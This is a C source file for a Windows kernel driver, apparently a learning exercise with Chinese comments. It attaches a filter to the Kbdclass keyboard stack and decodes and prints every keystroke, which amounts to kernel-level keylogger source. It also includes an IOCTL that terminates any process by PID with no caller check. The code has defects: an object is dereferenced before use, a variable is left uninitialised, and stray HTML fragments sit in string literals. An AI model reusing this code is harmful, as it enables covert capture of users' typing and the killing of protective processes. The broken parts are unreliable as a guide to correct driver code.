#include "Common.h"

NTSTATUS CreateDevice(PDRIVER_OBJECT pDriverObject)
{
	NTSTATUS		Status;
	PDEVICE_OBJECT	MyDevice;
	UNICODE_STRING	usDeviceName;
	UNICODE_STRING	usSymName;
	RtlInitUnicodeString(&usDeviceName, DEV_NAME);
	//创建设备
	Status = IoCreateDevice(pDriverObject, 0, &usDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &MyDevice);
	if (!NT_SUCCESS(Status))
	{
		KdPrint(("IoCreateDevice Failed !"));
		return Status;
	}
	MyDevice->Flags |= DO_BUFFERED_IO;
	RtlInitUnicodeString(&usSymName, SYM_LINK_NAME);
	//创建SymbolicLink
	Status = IoCreateSymbolicLink(&usSymName, &usDeviceName);
	if (!NT_SUCCESS(Status))
	{
		IoDeleteDevice(MyDevice);
		KdPrint(("IoCreateSymbolicLink Failed !"));
		return Status;
	}
	return Status;
}


NTSTATUS KillProcess(HANDLE Pid)
{
	NTSTATUS Status = STATUS_SUCCESS;
	HANDLE ProcessHandle;
	CLIENT_ID Client_Id;
	OBJECT_ATTRIBUTES ObjAttr;
	InitializeObjectAttributes(&ObjAttr, 0, 0, 0, 0);
	Client_Id.UniqueProcess = Pid;
	Client_Id.UniqueThread = 0;
	Status = ZwOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &ObjAttr, &Client_Id);
	if (!NT_SUCCESS(Status))
	{
		KdPrint(("ZwOpenProcess Failed !"));
		return Status;
	}
	ZwTerminateProcess(ProcessHandle, Status);
	ZwClose(ProcessHandle);
	return Status;
}


NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT pDriverObj, PIRP pIrp)
{
	NTSTATUS Status;
	Status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ULONG_PTR InLength = IrpStack->Parameters.DeviceIoControl.InputBufferLength;
	ULONG_PTR OutLength = IrpStack->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG_PTR IoControlCode = IrpStack->Parameters.DeviceIoControl.IoControlCode;
	PVOID pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ULONG_PTR info;
	switch (IoControlCode)
	{
	case IOCTL_READ:
	{
		KdPrint(("IOCTL_READ"));
		memset(pIoBuffer, 0xAA, OutLength);
		info = OutLength;
	}
	break;
	case IOCTL_WRITE:
	{
		KdPrint(("IOCTL_WRITE"));
		for (size_t i = 0; i < InLength; i++)
		{
			KdPrint(("%X", ((PUCHAR)(pIoBuffer))[i]));
		}
		info = OutLength;
	}
	break;
	case IOCTL_GETPID:
	{
		KdPrint(("IOCTL_GETPID"));
		HANDLE Pid;
		Pid = *(HANDLE*)pIoBuffer;
		KdPrint(("Pid: %d", Pid));
		Status = KillProcess(Pid);
		if (NT_SUCCESS(Status))
		{
			KdPrint(("关闭进程成功！"));
		}
		info = OutLength;
	}
	break;
	default:
		KdPrint(("CODE ERROR !"));
		Status = STATUS_UNSUCCESSFUL;
		break;
	}

	pIrp->IoStatus.Status = Status;
	pIrp->IoStatus.Information = info;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return Status;
}


NTSTATUS DispatchFunction(PDEVICE_OBJECT pDriverObj, PIRP pIrp)
{
	NTSTATUS Status;
	Status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = Status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS DispatchRead(PDEVICE_OBJECT pDriverObj, PIRP pIrp)
{
	NTSTATUS Status;
	Status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = Status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS DispatchPower(PDEVICE_OBJECT pDriverObj, PIRP pIrp)
{
	NTSTATUS Status;
	Status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = Status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS DispatchPnp(PDEVICE_OBJECT pDriverObj, PIRP pIrp)
{
	NTSTATUS Status;
	Status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = Status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


VOID SetDispatchFunction(PDRIVER_OBJECT pDriverObject)
{
	for (size_t i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriverObject->MajorFunction[i] = DispatchFunction;
	}
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	pDriverObject->MajorFunction[IRP_MJ_POWER] = DispatchPower;
	pDriverObject->MajorFunction[IRP_MJ_PNP] = DispatchPnp;
}


NTSTATUS BIndDevice(PDRIVER_OBJECT pDriverObject)
{
	NTSTATUS			Status;
	UNICODE_STRING		KbdName;
	//要打开的驱动对象
	PDRIVER_OBJECT		KbdDriverObject;
	//驱动对象的设备
	PDEVICE_OBJECT		KbdDeviceObject;
	//谁被扩展
	PDEVICE_EXTENSION	pDevExt;
	PDEVICE_OBJECT		pDevObj;
	RtlInitUnicodeString(&KbdName, L"\\Driver\\Kbdclass");
	Status = ObReferenceObjectByName(&KbdName,
		OBJ_CASE_INSENSITIVE, 
		NULL, 
		0, 
		*IoDriverObjectType, 
		KernelMode, 
		NULL, 
		(PVOID*)&KbdDriverObject);
	if (!NT_SUCCESS(Status))
	{
		KdPrint(("ObReferenceObjectByName Failed !  %X",Status));
		return Status;
	}
	else
	{
		ObDereferenceObject(KbdDriverObject);
	}
	KbdDeviceObject = KbdDriverObject->DeviceObject;
	while (KbdDeviceObject!=NULL)
	{
		Status = IoCreateDevice(pDriverObject, 
			sizeof(PDEVICE_OBJECT), 
			NULL, 
			KbdDeviceObject->DeviceType,
			KbdDeviceObject->Characteristics,
			FALSE,
			&pDevObj);
		if (!NT_SUCCESS(Status))
		{
			KdPrint(("IoCreateDevice Failed !"));
			return Status;
		}

		//存储设备对象
		pDevExt = (PDEVICE_EXTENSION)pDevObj->DeviceExtension;
		memset(pDevExt, 0, sizeof(DEVICE_EXTENSION));
		pDevExt->pDevice = pDevObj;
		pDevExt->poldDevice = KbdDeviceObject;
		//标志位
		pDevObj->Flags |= KbdDeviceObject->Flags & (DO_BUFFERED_IO | DO_DIRECT_IO | DO_POWER_PAGABLE);
		//该标识指示I/O管理器对全部发送到控制设备对象的Open请求进行安全检測
		pDevObj->Characteristics = KbdDeviceObject->Characteristics;
		//绑定设备
		PDEVICE_OBJECT topDev = IoAttachDeviceToDeviceStack(pDevObj, KbdDeviceObject);
		if (topDev == NULL)
		{
			IoDeleteDevice(pDevObj);
			KdPrint(("IoAttachDeviceToDeviceStack Failed !"));
			Status = STATUS_UNSUCCESSFUL;
			return Status;
		}
		//将绑定的设备和原始设备放入设备扩展中
		pDevExt->poldDevice = KbdDeviceObject;
		pDevExt->pbindDevice = topDev;
		KbdDeviceObject = KbdDeviceObject->NextDevice;
		pDevObj->Flags = pDevObj->Flags & ~DO_DEVICE_INITIALIZING;
	}
	KdPrint(("绑定成功！"));
	return Status;
}

// flags for keyboard status
#define	S_SHIFT				1
#define	S_CAPS				2
#define	S_NUM				4
static int kb_status = S_NUM;
void __stdcall print_keystroke(UCHAR sch)
{
	UCHAR	ch = 0;
	int		off = 0;

	if ((sch & 0x80) == 0)	//make
	{
		if ((sch < 0x47) ||
			((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock
		{
			ch = asciiTbl[off + sch];
		}

		switch (sch)
		{
		case 0x3A:
			kb_status ^= S_CAPS;
			break;

		case 0x2A:
		case 0x36:
			kb_status |= S_SHIFT;
			break;

		case 0x45:
			kb_status ^= S_NUM;
		}
	}
	else		//break
	{
		if (sch == 0xAA || sch == 0xB6)
			kb_status &= ~S_SHIFT;
	}

	if (ch >= 0x20 && ch < 0x7F)
	{
		DbgPrint("%C /n", ch);
	}

}


NTSTATUS CallBackKbdFilter(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	PIO_STACK_LOCATION currentIrp;
	PKEYBOARD_INPUT_DATA keyData;

	currentIrp = IoGetCurrentIrpStackLocation(Irp);

	if (NT_SUCCESS(Irp->IoStatus.Status))
	{
		keyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

		//DbgPrint("扫描码：%x",keyData->MakeCode);
		DbgPrint("键盘 ：%s", keyData->Flags ? "弹起" : "按下");
		print_keystroke((UCHAR)keyData->MakeCode);
	}
	if (Irp->PendingReturned)
	{
		IoMarkIrpPending(Irp);
	}
	return Irp->IoStatus.Status;
}

//派遣函数
NTSTATUS FilterDispatchRoutin(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
	PIO_STACK_LOCATION currentIrpStack;
	PDEVICE_EXTENSION pDevExt;
	//得到设备扩展
	pDevExt = (PDEVICE_EXTENSION)pDevObj->DeviceExtension;
	//得到当前irp包
	currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	//将当前irp拷贝到下层设备irp堆栈
	IoCopyCurrentIrpStackLocationToNext(pIrp);
	//保存原来的irp
	//pDevExt->tagIrp=pIrp;
	//代理irp
	pDevExt->proxyIrp = pIrp;
	//设置当irp完毕时的回调例程
	IoSetCompletionRoutine(pDevExt->proxyIrp, CallBackKbdFilter, pDevObj, TRUE, TRUE, TRUE);
	DbgPrint("irp回调例程设置完毕.../n");
	return IoCallDriver(pDevExt->poldDevice, pDevExt->proxyIrp);
}


BOOLEAN CancelIrp(PIRP pIrp)
{
	if (pIrp == NULL)
	{
		DbgPrint("取消irp错误.../n");
		return FALSE;
	}
	if (pIrp->Cancel || pIrp->CancelRoutine == NULL)
	{
		DbgPrint("取消irp错误.../n");
		return FALSE;
	}
	if (FALSE == IoCancelIrp(pIrp))
	{
		DbgPrint("IoCancelIrp to irp错误.../n");
		return FALSE;
	}
	//取消后重设此例为空
	IoSetCancelRoutine(pIrp, NULL);
	return TRUE;
}

//卸载例程
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	//得到设备
	PDEVICE_OBJECT pDevObj = pDriverObject->DeviceObject;
	while (pDevObj != NULL)
	{
		//设备扩展
		PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)pDevObj->DeviceExtension;
		PDEVICE_OBJECT pTagObj = pDevExt->pbindDevice;
		//解除绑定
		if (pDevExt->pbindDevice != NULL)
		{
			IoDetachDevice(pDevExt->pbindDevice);
		}
		//删除设备
		if (pDevExt->pDevice != NULL)
		{
			IoDeleteDevice(pDevExt->pDevice);
		}
		if (pDevExt->proxyIrp != NULL)
		{
			if (CancelIrp(pDevExt->proxyIrp))
			{
				DbgPrint("取消成功。。</p><p>。</p><p>/n");
			}
			else
			{
				DbgPrint("取消失败。。</p><p>。/n");
			}
		}
		//下一个设备
		pDevObj = pDevObj->NextDevice;
	}
	KdPrint(("驱动卸载成功！"));
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	NTSTATUS Status;
	KdPrint(("驱动加载成功！"));
	//设置派遣函数
	//SetDispatchFunction(pDriverObject);
	pDriverObject->MajorFunction[IRP_MJ_READ] = FilterDispatchRoutin;
	//创建设备对象
	//Status = CreateDevice(pDriverObject);
	//if (!NT_SUCCESS(Status))
	//{
	//	KdPrint(("创建device失败！"));
	//}
	//else
	//{
	//	KdPrint(("创建device成功！"));
	//	KdPrint(("%wZ", pRegistryPath));
	//}
	//驱动卸载例程
	Status = BIndDevice(pDriverObject);
	if (!NT_SUCCESS(Status))
	{
		KdPrint(("绑定失败！"));
	}
	else
	{
		KdPrint(("绑定成功！"));
	}
	pDriverObject->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}